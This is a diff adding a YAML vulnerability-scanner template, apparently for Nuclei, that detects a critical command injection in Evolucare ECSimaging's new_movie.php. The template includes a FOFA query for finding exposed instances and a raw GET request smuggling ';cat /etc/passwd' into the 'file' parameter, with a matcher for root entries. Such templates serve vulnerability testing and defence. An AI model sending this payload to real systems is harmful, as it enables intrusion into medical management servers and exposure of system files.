@@ -1,0 +1,24 @@
+id: evolucare-ecsimaging-rce
+
+info:
+  name: Evolucare Ecsimaging new_movie.php 远程命令执行
+  author: daffainfo
+  severity: critical
+  description: |
+    EVOLUCARE ECSimage是一款国外使用的医疗管理系统，研究发现其new_movie.php接口中存在命令注入漏洞,攻击者可利用该漏洞获取系统敏感信息等.漏洞影响:EVOLUCARE Evolucare Ecsimaging 6.21.5
+    fofa-query: body="ECSimaging"
+
+  tags: RCE
+
+http:
+  - raw:
+      - |
+        GET /new_movie.php?studyUID=1&start=2&end=2&file=1;cat+/etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+      
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1==200 && regex('root:.*:0', body_1)"
+        condition: and
